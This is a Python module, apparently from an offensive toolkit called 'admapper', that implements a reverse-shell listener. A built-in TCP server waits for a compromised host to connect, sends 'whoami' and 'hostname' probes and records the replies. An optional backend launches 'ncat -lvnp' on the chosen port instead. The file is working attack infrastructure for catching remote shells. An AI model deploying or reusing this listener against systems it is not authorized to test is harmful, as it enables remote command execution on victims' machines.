from __future__ import annotations

import socket
import subprocess
import threading
import time
from dataclasses import dataclass
from pathlib import Path

from admapper.support.output import print_info, print_success
from admapper.support.platform import resolve_executable


@dataclass
class ShellCapture:
    connected: bool = False
    peer: str = ""
    output: str = ""
    error: str = ""


class ReverseShellListener:
    """Built-in TCP listener — no external ncat required."""

    def __init__(self, port: int, *, bind_host: str = "0.0.0.0") -> None:
        self.port = port
        self.bind_host = bind_host
        self.capture = ShellCapture()
        self._sock: socket.socket | None = None
        self._conn: socket.socket | None = None
        self._thread: threading.Thread | None = None
        self._ready = threading.Event()
        self._connected = threading.Event()
        self._stop = threading.Event()

    def start(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        self._thread = threading.Thread(
            target=self._serve,
            name=f"admapper-listener-{self.port}",
            daemon=True,
        )
        self._thread.start()
        if not self._ready.wait(timeout=5):
            raise RuntimeError(f"listener failed to bind on port {self.port}")

    def _serve(self) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            sock.bind((self.bind_host, self.port))
            sock.listen(1)
            sock.settimeout(1.0)
            self._sock = sock
            self._ready.set()
            print_info(f"listener ready on {self.bind_host}:{self.port}")
            while not self._stop.is_set():
                try:
                    conn, addr = sock.accept()
                except TimeoutError:
                    continue
                except OSError:
                    break
                self._conn = conn
                self.capture.connected = True
                self.capture.peer = f"{addr[0]}:{addr[1]}"
                self._connected.set()
                print_success(f"reverse shell connected from {self.capture.peer}")
                self._probe_shell(conn)
                break
        finally:
            try:
                sock.close()
            except OSError:
                pass

    def _probe_shell(self, conn: socket.socket) -> None:
        try:
            conn.settimeout(8.0)
            time.sleep(0.5)
            chunks: list[str] = []
            try:
                chunks.append(conn.recv(4096).decode("utf-8", errors="replace"))
            except TimeoutError:
                pass
            for cmd in (b"whoami\r\n", b"hostname\r\n"):
                try:
                    conn.send(cmd)
                    chunks.append(conn.recv(4096).decode("utf-8", errors="replace"))
                except (TimeoutError, OSError):
                    break
            self.capture.output = "".join(chunks).strip()
        except OSError as exc:
            self.capture.error = str(exc)

    def wait(self, timeout: float) -> ShellCapture:
        self._connected.wait(timeout=max(timeout, 0))
        return self.capture

    def close(self) -> None:
        self._stop.set()
        for handle in (self._conn, self._sock):
            if handle is not None:
                try:
                    handle.close()
                except OSError:
                    pass


class NcatListener:
    """Optional external ncat backend (--use-ncat)."""

    def __init__(self, port: int) -> None:
        self.port = port
        self.capture = ShellCapture()
        self._proc: subprocess.Popen[str] | None = None

    def start(self) -> None:
        ncat = resolve_executable(["ncat", "nc"])
        if not ncat:
            raise RuntimeError("ncat/nc not found — use built-in listener (default)")
        if "ncat" in Path(ncat).name:
            cmd = [ncat, "-lvnp", str(self.port)]
        else:
            cmd = [ncat, "-lvnp", str(self.port)]
        print_info(f"listener: {' '.join(cmd)}")
        self._proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )

    def wait(self, timeout: float) -> ShellCapture:
        if not self._proc or not self._proc.stdout:
            return self.capture
        deadline = time.time() + timeout
        lines: list[str] = []
        while time.time() < deadline:
            if self._proc.poll() is not None:
                break
            line = self._proc.stdout.readline()
            if not line:
                time.sleep(0.2)
                continue
            lines.append(line)
            if "connect" in line.lower():
                self.capture.connected = True
                self.capture.output = "".join(lines)
                print_success("reverse shell activity on ncat listener")
                break
        return self.capture

    def close(self) -> None:
        if self._proc and self._proc.poll() is None:
            self._proc.terminate()
            try:
                self._proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                self._proc.kill()


def start_listener(port: int, *, use_ncat: bool = False) -> ReverseShellListener | NcatListener:
    if use_ncat:
        listener: ReverseShellListener | NcatListener = NcatListener(port)
    else:
        listener = ReverseShellListener(port)
    listener.start()
    return listener
